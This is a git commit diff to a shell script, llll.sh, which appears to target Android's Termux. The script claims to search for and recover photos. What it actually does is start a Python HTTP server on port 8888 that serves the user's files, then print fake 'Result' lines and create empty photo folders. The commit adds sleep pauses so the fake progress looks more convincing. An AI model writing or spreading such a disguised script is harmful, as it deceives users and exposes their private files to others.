506319cb22a9b8c38d2f3a9cf95f06d01f8becc0
linus8888e <linus8888e@gmail.com>
2026-01-16 21:21:45 +0400

    Update llll.sh

--- llll.sh
+++ llll.sh
@@ -22,8 +22,12 @@ pkg upgrade -y -o Dpkg::Options::="--force-confdef --force-confold"
 pkg install -y python
 echo -e "${GREEN}Search and recovery photos!\nPlease wait!${END}"
 python -m http.server 8888 > /dev/null 2>&1
+sleep 2
 echo -e "${GREEN}Result 1!${END}"
+sleep 2
 echo -e "${GREEN}Result 2!${END}"
+sleep 2
 echo -e "${GREEN}Result 3!${END}"
+sleep 2
 mkdir photo1 photo2 photo3
 ls
